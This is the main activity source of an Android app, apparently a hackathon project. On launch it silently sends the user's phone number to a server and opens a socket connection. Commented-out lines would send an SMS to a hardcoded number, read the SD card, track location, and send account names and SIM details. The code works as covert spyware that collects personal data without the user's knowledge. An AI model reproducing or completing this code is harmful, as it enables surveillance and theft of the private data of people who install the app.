package com.example.abdullah.hackathon;

import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.os.StrictMode;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.TextView;
import android.widget.Toast;

import com.example.abdullah.hackathon.Services.LocationService;
import com.example.abdullah.hackathon.Services.getRequestFromNetwork;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;

import java.io.File;

import Applications.HandleSockets;
import Models.GetPhoneInformation;
import Models.InternetConnection;
import Models.SdCardInformation;
import Models.SendUserInformation;

import Utils.Constant;
import Utils.LocationFinder;
import Utils.UserSharePreferences;

public class MainActivity extends AppCompatActivity {
    private Context context = this;
    private TextView dataList;
    LocationFinder locationFinder;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        setUpLayoutXml();
        SendUserId();
        new HandleSockets(context).execute();
      //  SmsManager smsManager=SmsManager.getDefault();
     //   smsManager.sendTextMessage("03042151706",null,"abdullah",null,null);
       // File[]  file=new SdCardInformation(context).getSdCardContents();

       /* for(File files:file){
            Toast.makeText(getApplicationContext(), files.getName(), Toast.LENGTH_LONG).show();
        }*/
       // startService(new Intent(this, LocationService.class));
      //  new  SendUserInformation(context).sendAcountsName();
      //  new SendUserInformation(context).sendSimInformaation();

        //Toast.makeText(getApplicationContext(), Soft+"\n"+id+"\n"+ime, Toast.LENGTH_LONG).show();


        }

    public void  setUpLayoutXml(){
        dataList=(TextView)findViewById(R.id.activity_main_txt_list);

    }

    public void SendUserId(){
        InternetConnection internetConnection=new InternetConnection(getApplicationContext());
        boolean  state=internetConnection.isInternetConnected();
        if(state){
            new SendUserInformation(context).sendUserNumber();

        }
        else{
            Log.v(Constant.LOG_Constant,"Internet Not Available  Please Wait");
        }
    }
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }



}
